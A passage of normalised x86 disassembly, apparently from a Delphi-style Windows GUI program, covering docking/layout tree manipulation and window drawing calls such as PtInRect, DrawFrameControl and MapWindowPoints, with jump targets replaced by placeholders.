pop ebx
retn
sub_444b68
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_4445a0
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_41250c
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43b58c
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4441cc
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_444a64
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_4441f0
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_445a90
mov edx esi
mov eax ebx
call sub_444a64
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_43bb70
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4441cc
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_43bb5c
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_444350
mov edx eax
mov eax edi
call sub_444740
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_444350
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_444350
mov edx eax
mov eax edi
call sub_444740
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_444350
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_444d78
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_444f20
jmp r-xdata
sub_444d78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4441cc
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_444718
mov edx eax
mov eax ebx
call sub_444740
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_444740
mov eax [ esi + 0x64 ]
call sub_444718
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_445de8
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_444acc
mov eax [ esi + 0x64 ]
call sub_444718
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_445de8
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_444acc
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_44616c
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_444acc
mov eax [ esi + 0x64 ]
call sub_444718
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_4462a0
xor edx edx
mov eax esi
call sub_444acc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_444740
adc edx 0x0
mov eax ebx
call sub_444400
mov eax ebx
call sub_444790
push esi
push sub_4462a0
xor edx edx
mov eax esi
call sub_444acc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_444f20
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_444400
mov eax [ ebx + 0x14 ]
call sub_444790
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_444f98
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_444718
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_444718
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_444718
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4442e4
mov esi eax
mov edx 0x2
mov eax ebx
call sub_4442e4
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_444718
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_4447f0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_444818
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4447f0
call sub_444f98
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_444818
call sub_444f98
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_444350
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_444350
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_4451c4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_43f0fc
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_43f0c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_4124bc
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445258
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4451c4
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_444818
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_444a64
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_444818
call sub_444f98
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_4452e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403f5c
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4045a8
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_445328
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_445520
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_4459f8
mov eax [ ebp - 0x8 ]
call sub_4449f4
xor edx edx
push ebp
push sub_445503
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44550a
mov eax [ ebp - 0x8 ]
call sub_4449f8
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4441cc
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_4452e0
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403420
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4444ec
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_4452e0
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_43baec
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_43c8e4
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403224
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_445530
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_4124e4
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d530
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445588
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41c9b0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41d10c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41d0ac
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41d0ac
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41c9b0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41d0ac
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41d0ac
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_445610
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_445530
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_445588
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_445588
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_445530
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_445588
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_445588
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4456ec
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cde0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_445842
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43a7a8
mov eax [ ebp - 0x4 ]
call sub_41d0e4
xor eax eax
push ebp
push sub_445825
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d5b0
xor eax eax
push ebp
push sub_445808
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_43f0fc
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44580f
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d5b0
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_43f0c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43b56c
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_445850
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_440efc
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_43b614
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_43b5d0
mov ecx eax
xor edx edx
xor eax eax
call sub_4124e4
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_4423cc
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41250c
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_4459c4
push ebp
mov ebp esp
push ebx
